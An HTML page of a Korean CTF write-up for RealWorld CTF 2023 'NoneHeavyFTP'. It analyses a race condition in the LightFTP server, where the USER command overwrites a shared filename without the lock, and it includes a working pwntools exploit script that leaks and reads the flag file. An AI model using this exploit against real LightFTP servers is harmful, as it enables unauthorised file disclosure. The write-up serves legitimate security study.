@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>RealWorld CTF 2023 - NoneHeavyFTP | msh1307</title>
+<meta name="keywords" content="RealWorld CTF 2023, RealWorld CTF NoneheavyFTP">
+<meta name="description" content="NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.
+Analysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.
+/flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있기에 flag 파일의 이름을 알아내야할 필요가 있다.
+https://github.com/hfiref0x/LightFTP
+그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다.
+탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.
+소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.
+// positive sp value has been detected, the output may be wrong!">
+<meta name="author" content="">
+<link rel="canonical" href="https://msh1307.kr/blog/realworld_ctf_2023_noneheavyftp/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-BR89V2WEC0');
+</script>
+<link rel="icon" href="https://msh1307.kr/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
+<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="RealWorld CTF 2023 - NoneHeavyFTP" />
+<meta property="og:description" content="NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.
+Analysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.
+/flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있기에 flag 파일의 이름을 알아내야할 필요가 있다.
+https://github.com/hfiref0x/LightFTP
+그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다.
+탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.
+소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.
+// positive sp value has been detected, the output may be wrong!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://msh1307.kr/blog/realworld_ctf_2023_noneheavyftp/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2023-01-07T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2023-01-07T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="RealWorld CTF 2023 - NoneHeavyFTP"/>
+<meta name="twitter:description" content="NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.
+Analysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.
+/flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있기에 flag 파일의 이름을 알아내야할 필요가 있다.
+https://github.com/hfiref0x/LightFTP
+그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다.
+탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.
+소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.
+// positive sp value has been detected, the output may be wrong!"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Blogs",
+      "item": "https://msh1307.kr/blog/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "RealWorld CTF 2023 - NoneHeavyFTP",
+      "item": "https://msh1307.kr/blog/realworld_ctf_2023_noneheavyftp/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "RealWorld CTF 2023 - NoneHeavyFTP",
+  "name": "RealWorld CTF 2023 - NoneHeavyFTP",
+  "description": "NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.\nAnalysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.\n/flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있기에 flag 파일의 이름을 알아내야할 필요가 있다.\nhttps://github.com/hfiref0x/LightFTP\n그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다.\n탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.\n소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.\n// positive sp value has been detected, the output may be wrong!",
+  "keywords": [
+    "RealWorld CTF 2023", "RealWorld CTF NoneheavyFTP"
+  ],
+  "articleBody": "NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.\nAnalysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.\n/flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있기에 flag 파일의 이름을 알아내야할 필요가 있다.\nhttps://github.com/hfiref0x/LightFTP\n그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다.\n탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.\n소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.\n// positive sp value has been detected, the output may be wrong! void *__fastcall ftp_client_thread(int *a1) { ... do { LABEL_10: if ( v26 == -1 || !(unsigned int)recvcmd_part_0((__int64)\u0026mutex, (char *)instr_recved, 0x1000LL) )// recvuntil \\r\\n break; v4 = instr_recved[0]; if ( LOBYTE(instr_recved[0]) ) { v5 = __ctype_b_loc(); v6 = 0LL; while ( ((*v5)[(char)v4] \u0026 0x400) == 0 ) { ++v6; v4 = *((_BYTE *)instr_recved + v6); if ( !v4 ) { v7 = (char *)instr_recved + v6; goto LABEL_41; } } v7 = (char *)instr_recved + v6; v8 = v6; if ( (v4 \u0026 0xDF) != 0 ) { do { ++v8; v4 = *((_BYTE *)instr_recved + v8); } while ( (v4 \u0026 0xDF) != 0 ); v9 = v8 - v6; } else { v9 = 0LL; } while ( v4 == ' ' ) { ++v8; v4 = *((_BYTE *)instr_recved + v8); } v10 = (char *)instr_recved + v8; // Second Arg? v11 = 0LL; if ( v4 ) v11 = v10; v19 = v11; } else { v7 = (const char *)instr_recved; LABEL_41: v19 = 0LL; v9 = 0LL; } v12 = (const char **)\u0026ftpprocs; v13 = 0; while ( strncasecmp(v7, *v12, v9) ) // instruction parsing { ++v13; v12 += 2; if ( v13 == 0x20 ) // instruction cnts -\u003e 32 { writelogentry((__int64)\u0026mutex, (__int64)\" @@ CMD: \", (__int64)instr_recved); if ( v40 ) ((void (__fastcall *)(__int64, const char *, __int64))gnutls_record_send)( v40, \"500 Syntax error, command unrecognized.\\r\\n\", 41LL); else send(v26, \"500 Syntax error, command unrecognized.\\r\\n\", 0x29uLL, 0x4000); goto LABEL_10; } } v14 = ((__int64 (__fastcall *)(pthread_mutex_t *, char *))(\u0026ftpprocs)[2 * v13 + 1])(\u0026mutex, v19);// CALL FTP USR if ( v13 == 0xD ) writelogentry((__int64)\u0026mutex, (__int64)\" @@ CMD: \", (__int64)\"PASS ***\"); else writelogentry((__int64)\u0026mutex, (__int64)\" @@ CMD: \", (__int64)instr_recved); } while ( v14 \u003e 0 ); ... } recvcmd_part_0 함수는 \\r\\n으로 끝나는 명령어가 오면, instruction operand로 잘 분리해서 저장해주고, 함수를 호출한다.\n.data.rel.ro:000000000000F8E0 ; \"USER\" .data.rel.ro:000000000000F8E8 dq offset ftpUSER .data.rel.ro:000000000000F8F0 dq offset aQuit+1 ; \"QUIT\" .data.rel.ro:000000000000F8F8 dq offset ftpQUIT .data.rel.ro:000000000000F900 dq offset aNoop ; \"NOOP\" 이런식으로 string과 함수 주소가 있어서 이에 맞는 핸들러가 호출된다.\n분석하면서 왜 mutex가 엄청 큰지 궁금했는데, 역시 구조체로 구현되어있었다.\ntypedef struct _FTPCONTEXT { pthread_mutex_t MTLock; SOCKET ControlSocket; SOCKET DataSocket; pthread_t WorkerThreadId; /* * WorkerThreadValid is output of pthread_create * therefore zero is VALID indicator and -1 is invalid. */ int WorkerThreadValid; int WorkerThreadAbort; in_addr_t ServerIPv4; in_addr_t ClientIPv4; in_addr_t DataIPv4; in_port_t DataPort; int File; int Mode; int Access; int SessionID; int DataProtectionLevel; off_t RestPoint; uint64_t BlockSize; char CurrentDir[PATH_MAX]; char RootDir[PATH_MAX]; char RnFrom[PATH_MAX]; char FileName[2*PATH_MAX]; gnutls_session_t TLS_session; SESSION_STATS Stats; } FTPCONTEXT, *PFTPCONTEXT; 함수가 호출되면서 FTPCONTEXT가 첫번째 인자로 들어가고 두번째 인자는 명령어의 operand가 들어간다.\nFile이나, Access, Mode같은 필드들이 있었다.\nVulnerability int ftpUSER(PFTPCONTEXT context, const char *params) { if ( params == NULL ) return sendstring(context, error501); context-\u003eAccess = FTP_ACCESS_NOT_LOGGED_IN; writelogentry(context, \" USER: \", (char *)params); snprintf(context-\u003eFileName, sizeof(context-\u003eFileName), \"331 User %s OK. Password required\\r\\n\", params); sendstring(context, context-\u003eFileName); /* Save login name to FileName for the next PASS command */ strcpy(context-\u003eFileName, params); return 1; } ftpUSER에서 FileName이 덮힌다.\nftp_effective_path에서\nsnprintf(path, PATH_MAX*2, \"%s/%s\", root_path, normalized_path); 위와 같이 root_path와 normalized_path를 붙이고 ..과 .은 독립적으로 처리가 되기 때문에 Path Traversal은 불가능하다.\nftp_effective_path(context-\u003eRootDir, context-\u003eCurrentDir, params, sizeof(context-\u003eFileName), context-\u003eFileName); while (stat(context-\u003eFileName, \u0026filestats) == 0) { if ( !S_ISDIR(filestats.st_mode) ) break; sendstring(context, interm150); writelogentry(context, \" MLSD-LIST \", (char *)params); context-\u003eWorkerThreadAbort = 0; pthread_mutex_lock(\u0026context-\u003eMTLock); ftpMLSD 함수의 일부분을 보면, ftp_effective_path를 호출하고 context-\u003eFileName을 체크하는 것을 알 수 있다.\n이때 root_path가 /server/data라서 거기에 있는 hello.txt를 읽고, mutex가 unlock될때 읽으면 된다고 생각했다.\n그때 mutex를 잘못알고 있어서, 저렇게 생각했었는데, 나중에 알아보니 굳이 mutex unlock 되고 바꿀 필요가 없었다.\nmutex는 기본적으로 쓰레드간 critical section 동시 진입을 막기 위해 존재한다. 그래서 lock을 걸면 mutex에 특정 값을 세팅하고 다른 쓰레드가 critical section에 진입하려하면 lock을 통해 mutex를 보고 막는다.\n만약 다른 쓰레드가 lock을 하지 않고 그냥 돌리게 되면 mutex를 확인도 안하고 그냥 돌리게 된다. 결과적으로 lock 되었는데도 불구하고 다른 쓰레드가 shared variable에 접근할 수 있게된다.\nExploit int ftpUSER(PFTPCONTEXT context, const char *params) { if ( params == NULL ) return sendstring(context, error501); context-\u003eAccess = FTP_ACCESS_NOT_LOGGED_IN; writelogentry(context, \" USER: \", (char *)params); snprintf(context-\u003eFileName, sizeof(context-\u003eFileName), \"331 User %s OK. Password required\\r\\n\", params); sendstring(context, context-\u003eFileName); /* Save login name to FileName for the next PASS command */ strcpy(context-\u003eFileName, params); return 1; } ftpUSER 함수에서 mutex lock을 안해서 mutex와 상관없이 context 구조체에 접근할 수 있다.\nftp_effective_path((__int64)(\u0026mutex[105].__align + 2), (__int64)\u0026mutex[3], a2, 0x2000uLL, \u0026mutex[310].__size[8]); v4 = stat64(\u0026mutex[310].__size[8], \u0026v9); // get stat of file align = mutex[515].__align; if ( !v4 \u0026\u0026 (v9.st_mode \u0026 0xF000) == 0x4000 ) { if ( align ) gnutls_record_send(); else send(mutex[1].__lock, \"150 File status okay; about to open data connection.\\r\\n\", 0x36uLL, 0x4000); writelogentry((__int64)mutex, (__int64)\" MLSD-LIST \", (__int64)a2); mutex[1].__spins = 0; pthread_mutex_lock(mutex); v7 = pthread_create(\u0026newthread, 0LL, (void *(*)(void *))mlsd_thread, mutex); mlsd_thread를 호출한다.\n그래서 이때 ftpUSER를 호출할 수 있는 상태가 된다.\nbuf.__pad[4] = (void *)__readfsqword(0x28u); pthread_mutex_lock(a1); if ( __sigsetjmp((struct __jmp_buf_tag *)\u0026buf, 0) ) { cleanup_handler(a1); __pthread_unwind_next(\u0026buf); } v1 = 0; __pthread_register_cancel(\u0026buf); mlsd_thread 함수의 첫부분을 보면 이때 mutex를 거는데, ftpUSER에서 mutex 상관없이 바꿀 수 있어서 사실상 무용지물이 된다.\n*(_QWORD *)fd = (unsigned int)create_datasocket(a1); if ( *(_DWORD *)fd != -1 ) { if ( !a1[515].__align || (unsigned int)ftp_init_tls_session(\u0026fd[4], *(unsigned int *)fd, 0) ) { v2 = opendir(\u0026a1[310].__size[8]); // open dir if ( v2 ) { do { v3 = readdir64(v2); if ( !v3 ) break; v1 = mlsd_sub(\u0026a1[310].__align + 1, *(unsigned int *)fd, *(_QWORD *)\u0026fd[4], v3); if ( !v1 ) break; } while ( !a1[1].__spins ); closedir(v2); } mutex 걸고 create_datasocket을 호출해서 fd를 받아오는데, PASSIVE MODE 걸어주고 돌리면, 포트에 접속할때까지 create_datasocket에서 멈춘다.\n그래서 멈췄을때 바로 FileName을 바꿔주면 안정적으로 race condition을 트리거할 수 있다.\nfd로 결과를 보내준다.\n이걸로 flag의 이름을 알 수 있다.\nfd = create_datasocket(a1); if ( fd != -1 ) { if ( *(_QWORD *)(a1 + 20600) ) { if ( !(unsigned int)ftp_init_tls_session(\u0026v15, fd, 0) ) goto LABEL_6; max_size = (void *)gnutls_record_get_max_size(v15); if ( max_size \u003e \u0026_data_start ) max_size = \u0026_data_start; } else { max_size = \u0026_data_start; } v4 = open64((const char *)(a1 + 12408), 0); *(_DWORD *)(a1 + 80) = v4; v5 = v4; 이거랑 같은 맥락으로 retr_thread도 FileName을 바꿔주면 된다.\n당연히 앞에 ftpUSER 함수에서 user name을 바꿨으니 다시 로그인?을 해줘야한다.\nSOCKET create_datasocket(PFTPCONTEXT context) { ... switch ( context-\u003eMode ) { ... case MODE_PASSIVE: asz = sizeof(laddr); clientsocket = accept(context-\u003eDataSocket, (struct sockaddr *)\u0026laddr, \u0026asz); close(context-\u003eDataSocket); context-\u003eDataSocket = clientsocket; if ( clientsocket == INVALID_SOCKET ) return INVALID_SOCKET; context-\u003eDataIPv4 = 0; context-\u003eDataPort = 0; context-\u003eMode = MODE_NORMAL; break; default: return INVALID_SOCKET; } return clientsocket; } PASSIVE MODE로 세팅해주고, 서버가 제공하는 포트에 접속해서 데이터를 받아주면 된다.\nExploit script from pwn import * sa = lambda x,y : p.sendafter(x,y) s = lambda x : p.send(x) rvu = lambda x : p.recvuntil(x) local =False if local==True: ip = '127.0.0.1' mip = b'127,0,0,1' else : ip = '47.89.253.219' mip = b'0,0,0,0' p = remote(ip,2121) context.log_level='debug' pay = b'USER anonymous\\r\\n' sa(b'ready',pay) pay = b'PASS AAAAA\\r\\n' sa(b' OK',pay) pay = b'PASV \\r\\n' sa(b'logged in',pay) pay = b'MLSD /\\r\\n' sa(b'Passive',pay) rvu(mip+b',') recv = rvu(b')')[:-1].split(b',') recv = [int(x) for x in recv] port = recv[0] * 256 + recv[1] success(f\"nc {ip} {port}\") s(b'USER /\\r\\n') print(\"flag name : \",end='') flag = input() s(b'USER anonymous\\r\\n') sa(b' OK',b'PASS AAAAA\\r\\n') sa(b'logged in',b'PASV \\r\\n') rvu(mip+b',') recv = rvu(b')')[:-1].split(b',') recv = [int(x) for x in recv] port = recv[0] * 256 + recv[1] success(f\"nc {ip} {port}\") flag = \"/\"+flag pay = b'RETR /hello.txt\\r\\n' s(pay) s(f'USER {flag[:-1]}\\r\\n') p.interactive() nc로 직접 접속해줘야된다.\nflag 이름 넣어주고 다른 포트로 다시 접속하면 된다.\n",
+  "wordCount" : "1269",
+  "inLanguage": "en",
+  "datePublished": "2023-01-07T00:00:00Z",
+  "dateModified": "2023-01-07T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://msh1307.kr/blog/realworld_ctf_2023_noneheavyftp/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "msh1307",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://msh1307.kr/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header sticky-header">
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-BR89V2WEC0');
+    </script>
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://msh1307.kr/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/blog" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/categories" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
+    <h1 class="post-title">
+      RealWorld CTF 2023 - NoneHeavyFTP
+    </h1>
+    <div class="post-meta">
+
+
+January 2023
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">‎ Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#nonheavyftp" aria-label="NonHeavyFTP">NonHeavyFTP</a><ul>
+                        
+                <li>
+                    <a href="#analysis" aria-label="Analysis">Analysis</a><ul>
+                        
+                <li>
+                    <a href="#vulnerability" aria-label="Vulnerability">Vulnerability</a></li></ul>
+                </li>
+                <li>
+                    <a href="#exploit" aria-label="Exploit">Exploit</a><ul>
+                        
+                <li>
+                    <a href="#exploit-script" aria-label="Exploit script">Exploit script</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="nonheavyftp">NonHeavyFTP<a hidden class="anchor" aria-hidden="true" href="#nonheavyftp">#</a></h1>
+<p><img loading="lazy" src="/blog/RealWorld_CTF_2023_NoneHeavyFTP/image.png" alt=""  />
+<br>
+난이도가 Baby인거 보고 달려들었는데, 어려웠다.</p>
+<h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
+<pre tabindex="0"><code>[ftpconfig]
+port=2121
+maxusers=10000000
+interface=0.0.0.0
+local_mask=255.255.255.255
+
+minport=30000
+maxport=60000
+
+goodbyemsg=Goodbye!
+keepalive=1
+
+[anonymous]
+pswd=*
+accs=readonly
+root=/server/data/
+</code></pre><p>ftp 서비스의 config 파일이다.<br>
+/flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있기에 flag 파일의 이름을 알아내야할 필요가 있다.<br>
+<a href="https://github.com/hfiref0x/LightFTP">https://github.com/hfiref0x/LightFTP</a><br>
+그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다.<br>
+탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.<br>
+소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// positive sp value has been detected, the output may be wrong!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">ftp_client_thread</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>LABEL_10:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v26 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">recvcmd_part_0</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)instr_recved, <span style="color:#ae81ff">0x1000LL</span>) )<span style="color:#75715e">// recvuntil \r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        v4 <span style="color:#f92672">=</span> instr_recved[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">LOBYTE</span>(instr_recved[<span style="color:#ae81ff">0</span>]) )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ctype_b_loc</span>();
+</span></span><span style="display:flex;"><span>          v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span> ( ((<span style="color:#f92672">*</span>v5)[(<span style="color:#66d9ef">char</span>)v4] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x400</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">++</span>v6;
+</span></span><span style="display:flex;"><span>            v4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v6);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 )
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>              v7 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v6;
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">goto</span> LABEL_41;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          v7 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v6;
+</span></span><span style="display:flex;"><span>          v8 <span style="color:#f92672">=</span> v6;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( (v4 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xDF</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">++</span>v8;
+</span></span><span style="display:flex;"><span>              v4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v8);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> ( (v4 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xDF</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> );
+</span></span><span style="display:flex;"><span>            v9 <span style="color:#f92672">=</span> v8 <span style="color:#f92672">-</span> v6;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            v9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span> ( v4 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39; &#39;</span> )
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">++</span>v8;
+</span></span><span style="display:flex;"><span>            v4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v8);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          v10 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)instr_recved <span style="color:#f92672">+</span> v8;      <span style="color:#75715e">// Second Arg?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          v11 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
